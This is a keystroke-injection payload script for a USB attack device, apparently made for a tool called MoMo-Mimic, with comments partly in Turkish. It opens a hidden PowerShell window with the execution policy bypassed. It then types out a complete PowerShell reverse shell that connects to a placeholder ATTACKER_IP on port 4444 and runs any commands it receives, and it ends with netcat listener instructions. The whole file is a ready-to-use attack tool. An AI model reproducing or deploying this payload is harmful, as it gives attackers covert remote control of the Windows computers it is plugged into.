// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_reverse_shell.js
// Target:  Windows 10/11
// Time:    ~5 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: PowerShell reverse shell - Hedef sisteme uzaktan erişim sağlar
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION - CHANGE THESE VALUES                                     │
// └─────────────────────────────────────────────────────────────────────────┘
var LHOST = "ATTACKER_IP";   // Listener IP adresi
var LPORT = "4444";          // Listener port

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);           // Maximum hız

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);                 // USB enumeration bekle

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN POWERSHELL (HIDDEN)                                        │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell -w hidden -ep bypass");
press("ENTER");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: REVERSE SHELL PAYLOAD                                           │
// └─────────────────────────────────────────────────────────────────────────┘
type("$c=New-Object Net.Sockets.TCPClient('" + LHOST + "'," + LPORT + ");");
type("$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
type("while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
type("$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);");
type("$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';");
type("$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ USAGE                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// Listener başlat: nc -lvnp 4444
// Veya: rlwrap nc -lvnp 4444 (daha iyi shell deneyimi)

